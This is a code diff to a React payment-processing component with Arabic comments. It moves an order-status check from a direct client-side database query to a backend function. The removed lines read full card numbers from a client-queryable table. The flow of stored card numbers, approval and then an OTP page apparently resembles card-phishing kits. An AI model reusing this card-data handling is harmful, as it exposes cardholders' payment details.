@@ -20,31 +20,42 @@ const ProcessingPayment = () => {
     "يرجى الانتظار قليلاً...",
   ];
 
-  // دالة التحقق من حالة الطلب والتحويل
+  // دالة التحقق من حالة الطلب والتحويل (عبر backend function لتجنب قيود صلاحيات قاعدة البيانات)
   const checkOrderStatusAndNavigate = async () => {
     if (!orderId) return false;
-    
+
+    const visitorSessionId = sessionStorage.getItem("visitor_session_id") || "";
+    if (!visitorSessionId) {
+      console.warn("visitor_session_id is missing; cannot check order status securely");
+      return false;
+    }
+
     try {
-      const { data, error } = await supabase
-        .from('customer_orders')
-        .select('status, card_number')
-        .eq('id', orderId)
-        .single();
-      
+      const { data, error } = await supabase.functions.invoke("order-status", {
+        body: { orderId, visitorSessionId },
+      });
+
       if (error) {
-        console.error("Error checking order status:", error);
+        console.error("Error checking order status (function):", error);
         return false;
       }
-      
-      if (data?.status === 'approved') {
-        const cardLast4 = data.card_number?.slice(-4) || '0000';
-        navigate(`/otp-verification?company=${encodeURIComponent(companyName)}&price=${price}&cardLast4=${cardLast4}&orderId=${orderId}`);
-        return true;
-      } else if (data?.status === 'rejected') {
-        navigate(`/payment?company=${encodeURIComponent(companyName)}&price=${price}&rejected=true`, { replace: true });
+
+      const status = data?.status as string | undefined;
+      if (status === "approved") {
+        const cardLast4 = (data?.cardLast4 as string | null) || "0000";
+        navigate(
+          `/otp-verification?company=${encodeURIComponent(companyName)}&price=${price}&cardLast4=${cardLast4}&orderId=${orderId}`,
+        );
         return true;
       }
-      
+
+      if (status === "rejected") {
+        navigate(`/payment?company=${encodeURIComponent(companyName)}&price=${price}&rejected=true`, {
+          replace: true,
+        });
+        return true;
+      }
+
       return false;
     } catch (err) {
       console.error("Error in checkOrderStatusAndNavigate:", err);
